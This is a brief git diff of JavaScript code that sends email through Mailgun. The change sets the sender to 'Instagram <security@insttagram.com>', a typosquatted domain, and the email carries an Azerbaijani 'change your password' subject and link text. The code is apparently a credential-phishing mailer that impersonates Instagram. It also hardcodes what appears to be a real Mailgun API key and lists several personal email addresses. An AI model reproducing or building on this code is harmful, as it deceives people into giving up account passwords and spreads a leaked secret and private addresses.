@@ -11,8 +11,8 @@ async function f() {
     const DOMAIN = "mg.lookin24.com";
     const mg = mailgun({apiKey: "6d3b67e2434192b5277e46b39e601277-f135b0f1-ae549850", domain: DOMAIN});
     const data = {
-        from: "Instagram <tariyelorujzade@gmail.com>",
-        to: "toghrulgasimov@gmail.com", //farid.naghizada@gmail.com //tariyelorujzade@gmail.com
+        from: "Instagram <security@insttagram.com>",
+        to: "tariyelorujzade@gmail.com", //farid.naghizada@gmail.com //tariyelorujzade@gmail.com
         subject: "Şifrəni dəyişin",
         text: "Parolu deyishmek ucun link budur",
         html: "<link href=\"https://fonts.googleapis.com/css?family=Indie+Flower|Overpass+Mono\" rel=\"stylesheet\">\n" +
